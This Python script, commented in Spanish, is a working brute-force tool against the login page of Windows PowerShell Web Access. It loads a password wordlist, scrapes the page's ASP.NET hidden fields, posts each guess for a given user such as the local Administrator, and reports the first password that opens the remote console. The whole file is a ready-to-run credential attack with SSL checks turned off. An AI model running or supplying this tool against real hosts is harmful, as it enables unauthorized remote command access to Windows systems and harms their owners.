#!/usr/bin/env python3
import sys
import requests
from urllib3.exceptions import InsecureRequestWarning
import re

# Deshabilitar warnings SSL (por usar https sin certificado válido)
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def validar_ip(url_base):
    try:
        res = requests.get(url_base, verify=False, timeout=5)
        if res.status_code == 200:
            return True
        else:
            print(f"[-] Error: Página no encontrada en {url_base} (status code: {res.status_code})")
            return False
    except requests.exceptions.RequestException:
        print(f"[-] Error: No se pudo conectar a {url_base}. Verifica que la IP sea correcta y esté accesible.")
        return False

def obtener_campos_hidden(html):
    viewstate = re.search(r'id="__VIEWSTATE" value="([^"]+)"', html)
    viewstategen = re.search(r'id="__VIEWSTATEGENERATOR" value="([^"]+)"', html)
    eventvalidation = re.search(r'id="__EVENTVALIDATION" value="([^"]+)"', html)

    return (
        viewstate.group(1) if viewstate else "",
        viewstategen.group(1) if viewstategen else "",
        eventvalidation.group(1) if eventvalidation else ""
    )

def fuerza_bruta_pswa(ip, usuario, diccionario):
    base_url = f"https://{ip}/pswa/en-US/logon.aspx"
    console_url = f"https://{ip}/pswa/en-US/console.aspx"

    MAX_INTENTOS = 1000  # para controlar que no sea muy grande el diccionario

    EXCEEDED_SESSION_MSG = "has reached the maximum allowed number of sessions per user"
    ACCESS_DENIED_MESSAGE = "Access to the destination computer has been denied. Verify that you have access to the destination Windows PowerShell session configuration."
    DISCONNECTED_SESSION_MSG = "One or more disconnected sessions are available to you on"

    print(f"[+] Verificando objetivo {ip}...")
    if not validar_ip(base_url):
        print(f"[-] IP o URL inválida: {base_url}")
        return

    print(f"[+] Objetivo válido, iniciando fuerza bruta contra {usuario} con {diccionario}\n")

    try:
        with open(diccionario, "r", encoding="utf-8", errors="ignore") as f:
            passwords = f.read().splitlines()
    except Exception as e:
        print(f"[-] Error leyendo diccionario: {e}")
        return

    session = requests.Session()
    session.verify = False  # ignorar SSL

    for idx, password in enumerate(passwords, start=1):
        if idx > MAX_INTENTOS:
            print("[!] Se alcanzó el límite máximo de intentos. Deteniendo.")
            break

        print(f"[{idx}] Probando password: {password}")

        # Obtener la página inicial para capturar campos hidden actualizados
        try:
            res_get = session.get(base_url, timeout=10)
        except requests.exceptions.RequestException as e:
            print(f"[-] Error al obtener la página de login: {e}")
            return

        viewstate, viewstategen, eventvalidation = obtener_campos_hidden(res_get.text)

        # Payload para el POST
        payload = {
            "__EVENTTARGET": "",
            "__EVENTARGUMENT": "",
            "__VIEWSTATE": viewstate,
            "__VIEWSTATEGENERATOR": viewstategen,
            "__EVENTVALIDATION": eventvalidation,
            "ctl00$MainContent$userNameTextBox": usuario,
            "ctl00$MainContent$passwordTextBox": password,
            "ctl00$MainContent$connectionTypeSelection": "computer-name",
            "ctl00$MainContent$targetNodeTextBox": ".",
            "ctl00$MainContent$connectionUriTextBox": "",
            "ctl00$MainContent$altUserNameTextBox": "",
            "ctl00$MainContent$altPasswordTextBox": "",
            "ctl00$MainContent$configurationNameTextBox": "Microsoft.PowerShell",
            "ctl00$MainContent$authenticationTypeSelection": "0",
            "ctl00$MainContent$useSslSelection": "0",
            "ctl00$MainContent$portTextBox": "5985",
            "ctl00$MainContent$applicationNameTextBox": "WSMAN",
            "ctl00$MainContent$allowRedirectionSelection": "0",
            "ctl00$MainContent$advancedPanelShowLabel": "10",
            "ctl00$MainContent$ButtonLogOn": "Sign+In"
        }

        try:
            res = session.post(base_url, data=payload, timeout=15)
        except requests.exceptions.RequestException as e:
            print(f"[-] Error al enviar POST: {e}")
            return

        # Comprobar mensajes de error específicos
        if EXCEEDED_SESSION_MSG in res.text:
            print("[!] WARNING: Se ha excedido el límite de sesiones permitidas para este usuario.")
            print("[!] Hay que esperar a que alguna sesión se cierre antes de seguir intentando.")
            return

        if ACCESS_DENIED_MESSAGE in res.text:
            print(f"[!] WARNING: Usuario {usuario} no tiene privilegios para iniciar sesión PSWA.")
            print("[!] El acceso remoto PowerShell puede estar deshabilitado o restringido para este usuario.")
            return  # Parar la ejecución

        # Detectar acceso exitoso - consola o mensaje de sesiones desconectadas
        if res.url.startswith(console_url) or DISCONNECTED_SESSION_MSG in res.text:
            print(f"[+] ¡Contraseña encontrada!: {password}")
            return

    print("\n[-] No se encontró ninguna contraseña válida en el diccionario.")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Uso: {sys.argv[0]} <IP> <usuario> <diccionario>")
        print(f"Ejemplo: {sys.argv[0]} 192.168.177.134 '.\\Administrator' rockyou.txt")
        sys.exit(1)

    ip = sys.argv[1]
    usuario = sys.argv[2]
    diccionario = sys.argv[3]

    fuerza_bruta_pswa(ip, usuario, diccionario)
